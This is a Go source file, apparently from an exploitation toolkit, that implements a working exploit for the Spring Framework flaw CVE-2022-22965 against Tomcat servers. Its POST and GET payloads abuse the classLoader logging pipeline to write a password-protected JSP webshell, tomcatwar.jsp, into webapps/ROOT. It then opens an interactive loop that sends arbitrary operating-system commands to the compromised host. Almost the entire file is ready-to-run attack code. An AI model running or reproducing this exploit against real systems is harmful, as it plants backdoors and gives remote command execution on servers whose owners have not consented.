package exppackage

import (
	"bufio"
	"fmt"
	"github.com/dlclark/regexp2"
	"github.com/fatih/color"
	"net/http"
	"os"
	"ssp/common"
	"strings"
	"time"
)

func CVE_2022_22965(url string, proxyURL string) {
	Headers_1 := map[string]string{
		"User-Agent":   common.GetRandomUserAgent(),
		"suffix":       "%>//",
		"c1":           "Runtime",
		"c2":           "<%",
		"DNT":          "1",
		"Content-Type": "application/x-www-form-urlencoded",
	}

	payload_linux := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
	payload_win := "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
	payload_http := "?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

	data1 := payload_linux
	data2 := payload_win
	getpayload := url + payload_http

	// 使用 MakeRequest 来发送 POST 请求
	for _, payload := range []string{data1, data2} {
		_, _, err := common.MakeRequest(url, "POST", proxyURL, Headers_1, payload)
		if err != nil {
			fmt.Println("Error executing POST request:", err)
			return
		}
		time.Sleep(500 * time.Millisecond)
	}

	// 使用 MakeRequest 来发送 GET 请求
	_, _, err := common.MakeRequest(getpayload, "GET", proxyURL, nil, "")
	if err != nil {
		fmt.Println("Error getting payload:", err)
		return
	}
	time.Sleep(500 * time.Millisecond)

	// 检查 tomcatwar.jsp 是否存在
	resp, err := http.Get(url + "tomcatwar.jsp")
	if err != nil {
		fmt.Println("Error checking tomcatwar.jsp:", err)
		return
	}

	shellURL := url + "tomcatwar.jsp?pwd=j&cmd=whoami"
	if resp.StatusCode == 200 {
		common.PrintVulnerabilityConfirmation("CVE_2022_22965", url, shellURL, "5")
		for {
			var Cmd string
			reader := bufio.NewReader(os.Stdin)

			fmt.Print("shell > ")
			Cmd, _ = reader.ReadString('\n')
			Cmd = strings.TrimSpace(Cmd)
			Cmd = strings.Replace(Cmd, " ", "%20", -1)
			if Cmd == "exit" {
				os.Exit(0)
			}
			urlShell := fmt.Sprintf("%stomcatwar.jsp?pwd=j&cmd=%s", url, Cmd)
			_, body, err := common.MakeRequest(urlShell, "GET", proxyURL, nil, "")
			if err != nil {
				color.Yellow("[-] URL为：%s，的目标积极拒绝请求，予以跳过\n", url)
				return
			}

			if err != nil {
				color.Yellow("[-] 重发包返回状态码500，请手动尝试利用WebShell：tomcatwar.jsp?pwd=j&cmd=whoami")
				break
			} else {
				re, err := regexp2.Compile(`[^/]+(?=//)`, 0)
				if err != nil {
					fmt.Println("Error compiling regexp:", err)
					return
				}
				match, _ := re.FindStringMatch(string(body))
				if match != nil {
					fmt.Println(match.String())
				}
			}
		}
	} else {
		color.Yellow("[-] %s 未发现CVE-2022-22965远程命令执行漏洞或者已经被利用,shell地址请手动尝试访问/tomcatwar.jsp?pwd=j&cmd=命令\n", url)
	}
}
